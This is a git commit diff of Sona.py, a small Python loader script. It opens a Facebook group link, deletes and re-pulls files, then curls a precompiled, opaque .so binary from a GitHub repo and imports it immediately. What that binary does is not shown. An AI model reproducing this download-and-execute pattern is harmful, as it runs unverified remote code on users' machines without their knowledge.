aac69bb9e547b15fbba99bbcef344c16affc11ba
FARABI-XD <142730104+FARABI-XD@users.noreply.github.com>
2023-08-27 14:14:38 +0600

    Update Sona.py

--- Sona.py
+++ Sona.py
@@ -1,12 +1,32 @@
-from os import system,remove
-from platform import machine
-import os
-system('git pull')
-#exit('security updating...')
-try:remove('RMXXD.so')
-except:pass
-if machine()=='aarch64':
-    system('curl -L https://github.com/FARABI-XD/.../raw/main/RMXXD.so -o RMXXD.so')
-    import RMXXD
-else:
-    print(' [=] Your Device Not Support ')
+#<\>!python3.11
+#<\>coded by RMX
+#----------------Don't Copy This Script--------------#
+import os, sys, platform
+try:
+    import requests
+except:
+    os.system('pip install requests')
+os.system('xdg-open https://facebook.com/groups/770617227293870/')
+import requests
+try:
+    if sys.argv[1]=='update':
+        os.system('rm -rf RMXXD.so')
+except:
+    pass
+os.system('rm -rf RMXXD.so')
+os.system('git pull')
+ 
+bit = platform.architecture()[0]
+if bit == '64bit':
+    if not os.path.isfile('RMXXD.so'):
+        os.system('curl -L https://github.com/ROX-CYBER/executables/blob/main/RMXXD.cpython-311.so?raw=true -o RMXXD.so') 
+        import RMXXD
+        #RMXXD.RM()
+    else:
+        import RMXXD
+        #RMXXD.RM()
+elif bit == '32bit':
+    exit('\033[1;31m\n Sorry System or 32bit device not supported ')
+    
+    
+ 
